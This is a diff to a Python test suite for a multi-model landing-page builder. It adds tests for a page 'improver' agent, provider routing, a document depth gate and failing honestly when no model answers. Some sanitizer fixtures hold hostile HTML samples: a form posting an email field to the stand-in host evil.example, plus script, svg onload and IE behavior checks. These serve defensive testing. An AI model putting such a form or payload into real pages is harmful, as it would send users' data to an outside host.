@@ -28,6 +28,7 @@ os.environ["LANDING_LEDGER"] = str(TMP / "quota.json")
 os.environ["LANDING_OUT"] = str(TMP / "out")
 os.environ["LANDING_ENV_FILE"] = str(TMP / "no-such.env")        # never read the real worker/.env keys in tests
 os.environ["LANDING_UNAVAIL"] = str(TMP / "unavailable.json")
+os.environ["LANDING_NO_DEFAULTS"] = "0"          # the routing tests assert the old code defaults; t_no_defaults checks the new rule
 for _k in [k for k in os.environ if k.startswith(("GEMINI_API_KEY", "GROQ_API_KEY", "MISTRAL_API_KEY",
                                                    "OPENROUTER_API_KEY"))]:
     os.environ.pop(_k)
@@ -140,6 +141,8 @@ class FakeGemini:
         if schema is not None:                      # A1: a model-like variation on the default document
             FakeGemini.a1_parts = parts
             out = copy.deepcopy(flow.default_doc(H))
+            out["strategic_cards"] = out.get("strategic_cards") or [{"card_id": f"card_{i}", "tag": "Live", "heading": h, "body": "A night of sound and light.",
+                                     "accent_color_key": "overlay_primary"} for i, h in ((1, "x"), (2, "Crowd"), (3, "Lights"))]
             out["strategic_cards"][0]["heading"] = "Neon nights, live"
             out["typography"]["display"]["family"] = "Not A Real Font"           # code resolves it to a real face
             if any("previous answer failed" in p.get("text", "") for p in parts):
@@ -147,6 +150,11 @@ class FakeGemini:
             bad = copy.deepcopy(out)
             bad["strategic_cards"][1]["card_id"] = "card_1"             # consistency failure -> repair call
             return providers.Reply(json.dumps(bad), model, "STOP", {"in": 4000, "out": 800})
+        if "the Improver" in system:                # A6: the page it was shown, with one marked improvement
+            FakeGemini.a6_parts = parts
+            page = parts[-1]["text"].split("\n", 1)[1]
+            return providers.Reply(page.replace("<style>", "<style>.x-improved{outline:0}", 1), model, "STOP",
+                                   {"in": 9000, "out": 9000})
         FakeGemini.a5_attempts += 1                 # A5: hostile first, then a page whose decor covers the h1
         spec = json.loads(parts[0]["text"].split("\n\nYour previous")[0])
         motif = (spec.get("motif_ids") or [None])[0]
@@ -222,6 +230,8 @@ class FakeMistral:
         if name == "a1":
             FakeMistral.a1_content = user
             out = copy.deepcopy(flow.default_doc(H))
+            out["strategic_cards"] = out.get("strategic_cards") or [{"card_id": f"card_{i}", "tag": "Live", "heading": h, "body": "A night of sound and light.",
+                                     "accent_color_key": "overlay_primary"} for i, h in ((1, "x"), (2, "Crowd"), (3, "Lights"))]
             out["strategic_cards"][0]["heading"] = "Seen by Mistral"
             return providers.Reply(json.dumps(out), model, "stop", {"in": 14000, "out": 1500})
         if name == "a5":
@@ -275,11 +285,17 @@ class FakeOpenRouter:
         if name == "a1":
             FakeOpenRouter.a1_messages = messages
             out = copy.deepcopy(flow.default_doc(H))
+            out["strategic_cards"] = out.get("strategic_cards") or [{"card_id": f"card_{i}", "tag": "Live", "heading": h, "body": "A night of sound and light.",
+                                     "accent_color_key": "overlay_primary"} for i, h in ((1, "x"), (2, "Crowd"), (3, "Lights"))]
             out["strategic_cards"][0]["heading"] = "Seen through OpenRouter"
             return providers.Reply(json.dumps(out), model, "stop", {"in": 16000, "out": 6000})
         if name == "a5":
             spec = json.loads(messages[-1]["content"].split("\n\nYour previous")[0])
             return providers.Reply(render_doc_page(spec), model, "stop", {"in": 9000, "out": 12000})
+        if name == "a6":                            # the improver: the page it was shown, marked
+            page = messages[-1]["content"][-1]["text"].split("\n", 1)[1]
+            return providers.Reply(page.replace("<style>", "<style>.x-improved{outline:0}", 1), model, "stop",
+                                   {"in": 12000, "out": 9000})
         if name in ("a2", "a3", "a4") and FakeOpenRouter.text_ok:
             if FakeOpenRouter.text_rate:
                 raise providers.ProviderError("rate", "Rate limit exceeded: free-models-per-min", 40.0)
@@ -294,10 +310,14 @@ STATE: dict = {}
 
 
 NEW_CHAINS = dict(pipeline.CHAINS)
+REAL_A1_MIN = dict(pipeline.A1_MIN)
+# the fixtures' documents are synthetic (code defaults with a twist) and thin by design: the routing tests count
+# exact calls, so A1's depth gate is off for them; t_a1_depth checks the gate itself
+pipeline.A1_MIN = {"chars": 0, "words_per_section": 0, "sections": 0}
 # the routing tests below were written for the previous order; t_priority checks the current one
 LEGACY_CHAINS = {"a1": ["openrouter:vision", "openrouter:vision-alt", "mistral:vision", "gemini"], "a2": ["groq:big", "mistral:text"],
                  "a3": ["groq:big", "mistral:text"], "a4": ["groq:vision", "groq:big", "mistral:text"],
-                 "a5": ["openrouter:compose", "mistral:compose", "gemini"]}
+                 "a5": ["openrouter:compose", "mistral:compose", "gemini"], "a6": ["gemini"]}
 
 
 def t_priority(h):
@@ -323,9 +343,9 @@ def t_priority(h):
             m.setdefault(t["agent"], t.get("model") or "")
         line = next((n for n in NOTES if n.startswith("models: ")), "")
         check("A1 gemini-4-hydrogen -> gemini-3.8-flash -> openrouter/" in line
-              and line.split("A2 ")[1].split(";")[0].endswith("openai/gpt-oss-120b -> mistral-medium-latest -> "
-                                                              "ministral-8b-latest -> ministral-14b-latest"),
-              "chains: Gemini first, then OpenRouter, Groq for A2-A4, Mistral last")
+              and "openai/gpt-oss-120b" in line.split("A2 ")[1].split(";")[0] and "mistral" not in line
+              and "ministral" not in line,
+              "chains: Gemini first for A1, Groq on A2-A4, no Mistral anywhere (402: needs a subscription)")
         check(m["a1"].startswith("openrouter/") and m["a5"].startswith("openrouter/"),
               f"Gemini overloaded: A1 / A5 fall to OpenRouter ({m['a1']}, {m['a5']})")
         check(all(m[a].startswith("openrouter/") for a in ("a2", "a3", "a4")),
@@ -740,20 +760,29 @@ def t_pipeline_models(h, qa):
     check(any("needs 4.5:1" in w or "reaches 4.5:1" in w for w in ov), "A3's unreadable colour is fixed (logged)")
     check(any("removed svg[onload]" in w or "<script>" in w for w in ov), "A4's svg is sanitized (logged)")
     cands = r["candidates"]
-    check(len(cands) == 2 and not any(c["blocking"] for c in cands) and cands[0]["advisory"]
-          and len(cands[1]["advisory"]) < len(cands[0]["advisory"]) and r["page_source"] == "repaired",
-          f"A5: the hostile page is sanitized, not discarded; its findings go to the repair and the better page ships "
-          f"({[len(c['advisory']) for c in cands]}, {r['page_source']})")
-    check(r["page_source"] == "repaired" and all((Path(r["out"]) / c["file"]).exists() for c in cands),
-          f"every candidate is kept on disk; the repaired page ships ({r['page_source']})")
+    check([c["source"] for c in cands] == ["model", "improved"] and not any(c["blocking"] for c in cands)
+          and cands[0]["advisory"] and r["page_source"] == "improved",
+          f"A5: the hostile page renders, so it is never sent back (no repair); the improver's page ships "
+          f"({[c['source'] for c in cands]}, {r['page_source']})")
+    check(all((Path(r["out"]) / c["file"]).exists() for c in cands) and cands[1]["file"] == "a6.html",
+          "every candidate is kept on disk (a5-1.html, a6.html)")
     html = (Path(r["out"]) / "index.html").read_text(encoding="utf-8")
-    check("<script" not in html and "evil.example" not in html and "#123456" not in html, "the final page is clean")
+    check("<script" not in html and "evil.example" not in html, "the final page is safe (script and external URL gone)")
+    check("#123456" in html and any("colours not in the spec palette" in a for a in cands[0]["advisory"]),
+          "a stray colour is reported, not snapped: nothing but the safety sanitizer edits a page (the user's rule)")
+    check(".x-improved" in html, "the improved page is the one that ships")
     check("Neon nights, live" in html, "A1's card copy reaches the page")
+    a6t = next((t for t in r["trace"] if t["agent"] == "a6"), {})
+    check(a6t.get("source") == "model" and a6t.get("improves") == "a5-1.html", f"A6 traced ({a6t.get('source')})")
     if qa:
-        check(any("moved decor behind the content" in o["why"] for o in r["overrides"]),
-              "decoration painted over the h1 is moved behind it by code, not deleted (the page still ships)")
-        check(not any(c for p in r["qa"].values() for c in p["problems"] if "overlaps text" in c),
-              "browser: no text overlaps on the shipped page")
+        check(not any("moved decor behind the content" in o["why"] for o in r["overrides"])
+              and any("covers text" in a for a in cands[0]["advisory"]),
+              "decoration painted over the h1 is reported to the improver; code moves nothing")
+        heads = [p["text"] for p in getattr(FakeGemini, "a6_parts", []) if p.get("text", "").startswith("[DESKTOP")]
+        n6 = sum(1 for p in getattr(FakeGemini, "a6_parts", []) if "image" in p)
+        check(heads and n6 == len([p for p in FakeGemini.a6_parts if p.get("text", "").startswith("[")]),
+              f"A6 saw the rendered page: each screenshot tile after its header ({len(heads)} desktop tile(s))")
+        check("readability" in r["qa"][1440], "the shipped page's readability is measured")
     heads = [p["text"] for p in getattr(FakeGemini, "a1_parts", []) if "text" in p and p["text"].startswith("[IMAGE")]
     n_img = sum(1 for p in getattr(FakeGemini, "a1_parts", []) if "image" in p)
     check(len(heads) == n_img == len(h["images"]) and heads[2].startswith("[IMAGE 3 · palette: palette-image · PALETTE_REF]"),
@@ -773,7 +802,7 @@ def t_pipeline_models(h, qa):
     r4 = pipeline.run(h, enabled=True, force_from="a3", qa=False, log=lambda *a: None)
     srcs = {t["agent"]: t["source"] for t in r4["trace"]}
     check(srcs["a1"] == "cache" and srcs["a2"] == "cache" and srcs["a3"] == "model", f"force_from=a3 re-runs only A3 onward ({srcs})")
-    check(len(a5_calls) >= 2, "A5 was called (and repaired once)")
+    check(len(a5_calls) >= 2, "A5 and A6 were called")
     # both Gemini models unavailable -> A1 is code's default document, with no fallback to another provider
     FakeGemini.busy = {"gemini-3.8-flash"}
     n0 = len(Calls.log)
@@ -786,6 +815,7 @@ def t_pipeline_models(h, qa):
 
 
 def _reset_router():
+    keys.health_reset()
     pipeline._PREFERRED.clear()
     pipeline._NONSTRICT.clear()
     keys._COOL.clear()
@@ -830,7 +860,7 @@ def t_pipeline_mistral(h):
     Calls.log.clear()
     FakeGemini.a5_attempts = 0
     try:
-        r = pipeline.run(h, enabled=True, qa=False, a5_repair=False, log=lambda *a: None)
+        r = pipeline.run(h, enabled=True, qa=False, a5_repair=False, improve=False, log=lambda *a: None)
         tr = {}
         for t in r["trace"]:
             tr.setdefault(t["agent"], t)
@@ -967,7 +997,7 @@ def t_pipeline_openrouter(h):
     NOTES.clear()
     Calls.log.clear()
     try:
-        r = pipeline.run(h, enabled=True, qa=False, a5_repair=False, log=lambda *a: None)
+        r = pipeline.run(h, enabled=True, qa=False, a5_repair=False, improve=False, log=lambda *a: None)
         tr = {}
         for t in r["trace"]:
             tr.setdefault(t["agent"], t)
@@ -1343,6 +1373,149 @@ def t_lenient(h):
           f"A3: synonym kinds mapped, its own kinds kept ({[x['kind'] for x in items]})")
 
 
+def t_r0_fixes(h):
+    """The fixes from the user's R0 review (2026-11-26), each on the case that broke a real Studio build."""
+    # P2: a form is inert UI whose words count (the dog inquiry form / merch signup vanished and failed the copy check)
+    spec = {"palette": {"a": "#000000"}, "fonts": [], "copy": ["Notify Me", "Enter your email"], "item_ids": ["f"],
+            "section_ids": []}
+    form = ('<style>body{}</style><body><h1>x</h1><form action="https://evil.example/s" method="post" data-item="f">'
+            '<input type="email" name="e" placeholder="Enter your email"><input type="file">'
+            '<button type="submit">Notify Me</button></form></body>')
+    chk = validate_page.check(form, spec)
+    check(not chk["errors"] and 'type="button"' in chk["html"] and "evil.example" not in chk["html"]
+          and 'type="file"' not in chk["html"] and "form-action 'none'" in chk["html"] and "</input>" not in chk["html"],
+          f"P2: a form stays as inert UI, its button and placeholder count as copy ({chk['errors'][:1]})")
+    # P3: scroll-behavior is a normal property (every R0 page was flagged css[unsafe] and kept a broken 'scroll-;')
+    css, dropped = validate_page.sanitize_css("html{scroll-behavior:smooth}.x{behavior:url(a.htc)}.y{color:red}", set())
+    check("scroll-behavior:smooth" in css and ".x{}" in css and ".y{color:red}" in css and dropped == ["css[unsafe]"],
+          f"P3: scroll-behavior kept, IE behavior removed, the next rule intact ({css})")
+    # fonts: Monofett never offered, never kept (unreadable when set heavy, R0 Arijit page)
+    pool = handoff.font_pool(["Monofett", "Inter"], ["Monofett", "Lora"])
+    fam, note = handoff.resolve_font("Monofett", pool, "display stencil")
+    check("Monofett" not in pool and fam != "Monofett" and "blocked" in (note or ""),
+          f"Monofett is blocked from the pool and from A1's choices ({fam})")
+    # section roles: a nav named as such is not a footer (Nemotron VL, R0 CPU page)
+    check(flow.role_by_name("top-navigation-bar", 0, 5) == "nav" and flow.role_by_name("navy-collection", 0, 5) is None
+          and flow.role_by_name("footer", 4, 5) == "footer", "a section's role follows its own name and place")
+    # A2 salvage: one broken entry no longer costs the whole plan (R0 CPU page: 4 good sections lost)
+    st = S.State(h)
+    flow.after_a1(st, flow.default_doc(h), h)
+    sids, eids, names = flow.a2_enums(st)
+    broken = {"layout_plan": {"canvas": {"content_width_px": 1200}, "sections": [
+        {"section_id": sids[0], "layout": "grid", "size": "auto", "surface": "not a colour"}, "",
+        {"section_id": "nope", "layout": "x"}]}}
+    sv = pipeline.salvage(st, "a2", [broken])
+    schema = sc.a2(sids, eids, names)
+    import jsonschema
+    try:
+        jsonschema.validate(sv, schema)
+        ok = True
+    except jsonschema.ValidationError:
+        ok = False
+    check(ok and [x["section_id"] for x in sv["layout_plan"]["sections"]] == [sids[0]],
+          "A2 salvage: the usable section is kept and made valid; code fills the rest")
+    # picture slots: each becomes a real image when one is spare, else a drawing for the improver
+    d = flow.default_doc(h)
+    sec = d["content_sections"][-1]["section_id"]
+    d["image_slots"] = [{"slot_id": "pup-1", "section_id": sec, "subject": "a golden retriever puppy",
+                         "style": "glossy clay", "aspect": "1:1"},
+                        {"slot_id": "pup-2", "section_id": "no-such", "subject": "x", "style": "", "aspect": "1:1"}]
+    st = S.State(h)
+    flow.after_a1(st, d, h)
+    flow.after_a2(st, flow.default_plan(st))
+    flow.after_a3(st, flow.default_copy(st, h))
+    flow.after_a4(st, flow.default_decor(st))
+    sp = flow.spec(st)
+    its = [it for s_ in sp["sections"] for it in s_["items"] if it["item_id"] == "img-pup-1"]
+    check(len(its) == 1 and its[0]["kind"] in ("image", "drawing") and "img-pup-1" in sp["item_ids"]
+          and not any(it["item_id"] == "img-pup-2" for s_ in sp["sections"] for it in s_["items"]),
+          f"an image slot reaches the spec in its section ({its[0]['kind'] if its else None}); a slot in no section is dropped")
+    check(all(a.get("aspect") for a in sp["assets"] if a.get("width")), "every image asset carries its aspect")
+    # colour distribution: inside each section the text roles resolve to its readable colours (R0 merch h1)
+    css_s = sp.get("section_vars_css", "")
+    page = render_doc_page(sp)
+    html = validate_page.check(page, sp)["html"]
+    check("[data-section=" in css_s and "--text-top-heading:var(" in css_s
+          and html.index(css_s.splitlines()[0]) < html.index(":root{"),
+          "section-scoped text roles are declared before the page's own CSS (the page may still override them)")
+    # the improver's guard and tiles
+    check(pipeline.copy_kept("<body><p>Notify Me</p><input placeholder=\"Enter your email\"></body>", spec) == 1.0
+          and pipeline.copy_kept("<body><p>other</p></body>", spec) == 0.0, "copy kept: text and placeholders count")
+    from PIL import Image
+    shots = TMP / "tiles"
+    shots.mkdir(parents=True, exist_ok=True)
+    Image.new("RGB", (960, 4400), "white").save(shots / "1440_full.jpg")
+    Image.new("RGB", (390, 2000), "white").save(shots / "390_full.jpg")
+    tiles = pipeline.shot_tiles(shots)
+    check([t[0].split(" · ")[0] for t in tiles].count("[DESKTOP 1440 px") == 5 and "continues below" in tiles[4][0]
+          and [t[0].split(" · ")[0] for t in tiles].count("[PHONE 390 px") == 2,
+          f"the improver sees the page in screen-sized tiles, top to bottom ({len(tiles)})")
+    # model health: two provider-side failures in a row skip a model across builds; one answer clears it
+    keys.health_reset()
+    keys.health_fail("m-x", "503")
+    first = keys.health_skip("m-x")[0]
+    keys.health_fail("m-x", "503")
+    second = keys.health_skip("m-x")[0]
+    keys.health_ok("m-x")
+    check(first == 0 and second > 3600 and keys.health_skip("m-x")[0] == 0,
+          "P5: a model that failed twice in a row is skipped for 2 h; an answer clears it")
+    keys.health_reset()
+
+
+def t_a1_depth(h):
+    """A1's depth gate (the user's call, 2026-11-26): a thin document gets one more A1 call on the next vision model."""
+    thin = flow.default_doc(h)
+    rich = copy.deepcopy(thin)
+    for sec in rich["content_sections"]:
+        sec["what"] = [w + " - " + " ".join(["detail"] * 60) for w in sec["what"]] or [" ".join(["x"] * 60)]
+    rich["aesthetic_direction"] = " ".join(["observed"] * 900)
+    rich["content_sections"] = (rich["content_sections"] * 3)[:7]
+    saved = dict(pipeline.A1_MIN)
+    pipeline.A1_MIN.update(REAL_A1_MIN)
+    try:
+        mt, mr = pipeline.a1_measure(thin), pipeline.a1_measure(rich)
+        check(pipeline.a1_thin(mt) and not pipeline.a1_thin(mr) and mr["score"] > mt["score"],
+              f"A1 depth: a thin document is flagged ({pipeline.a1_thin(mt)}), a rich one passes (score {mr['score']})")
+    finally:
+        pipeline.A1_MIN.clear()
+        pipeline.A1_MIN.update(saved)
+
+
+def t_no_defaults(h):
+    """No deterministic fallbacks (the user's call, 2026-11-26): every model out -> retry rounds, then the job fails
+    honestly (AgentUnavailable); nothing canned is used. Also the Studio lines for backups / waits / defaults."""
+    import eta as ETA
+    os.environ["LANDING_NO_DEFAULTS"] = "1"
+    saved_waits, saved_busy = pipeline.RETRY_WAITS, set(FakeGemini.busy)
+    pipeline.RETRY_WAITS = (0.0, 0.0)
+    FakeGemini.busy = {"gemini-4-hydrogen", "gemini-3.8-flash"}
+    _reset_router()
+    events = []
+    try:
+        pipeline.run(h, enabled=True, force_from="a1", qa=False, log=lambda *a: None, progress=events.append)
+        check(False, "no model for A1: the job fails instead of using the default document")
+    except pipeline.AgentUnavailable as e:
+        check(e.agent == "a1" and "Nothing was published" in str(e),
+              f"no model for A1: AgentUnavailable after the retry rounds, no default document ({str(e)[:80]})")
+        check(sum(1 for ev in events if ev.get("kind") == "wait" and ev.get("agent") == "a1") == 2,
+              "the Studio hears each wait round")
+    finally:
+        os.environ["LANDING_NO_DEFAULTS"] = "0"
+        pipeline.RETRY_WAITS = saved_waits
+        FakeGemini.busy = saved_busy
+        _reset_router()
+    seen = {}
+    ETA.describe({"kind": "try", "agent": "a6", "model": "gemini-3.6-flash"}, seen)
+    line = ETA.describe({"kind": "try", "agent": "a6", "model": "openrouter/inclusionai/ling-3.2-flash:free",
+                         "after": "timed out"}, seen)
+    check("timed out" in line and "backup model" in line, f"Studio: a backup model is named as such ({line[:90]})")
+    check("plainer than usual" in ETA.describe({"kind": "done", "agent": "a3", "source": "default"}, {})
+          and "waiting 45 s" in ETA.describe({"kind": "wait", "agent": "a1", "s": 45, "round": 1}, {}),
+          "Studio: default and wait lines")
+    check(ETA.quality_notes([{"agent": "a6", "source": "failed"}]) == ["the final polish: skipped (the improver was unavailable)"],
+          "the closing quality note names a skipped improver")
+
+
 def t_bad_json():
     """A model that returns malformed JSON (a Studio job crashed on it, 2026-11-22): a bad reply, so the router moves
     to the next model; never an exception that ends the job."""
@@ -1447,7 +1620,7 @@ def t_eta():
     check(abs(e.remaining() - (after_a1 + 0.15 * ETA.DEFAULT_S["a1"])) <= 1, "an overrunning step keeps a sliver")
     e.enter("a5")
     e.enter("repair")
-    check(e.order()[-2:] == ["repair", "publish"], "a repair counts once it starts")
+    check(e.order()[-3:] == ["repair", "a6", "publish"], "a repair counts once it starts (before the improver)")
     e.enter("publish")
     now[0] += 10
     e.finish(True)
@@ -1492,6 +1665,8 @@ def main():
         t_decor_layers(h)
         t_drawn_centerpiece(h)
         t_lenient(h)
+        t_r0_fixes(h)
+        t_a1_depth(h)
         if qa:
             r = pipeline.run(h, enabled=False, qa=True, log=lambda *a: None)
             check(not any("overlaps text" in p or "overflow" in p for x in r["qa"].values() for p in x["problems"]),
@@ -1515,6 +1690,7 @@ def main():
     H = load(names[0])
     patch()
     t_pipeline_models(H, qa)
+    t_no_defaults(H)
     print("--- the current provider priority (Gemini -> OpenRouter -> Groq -> Mistral)")
     t_priority(H)
     t_upstream(H)
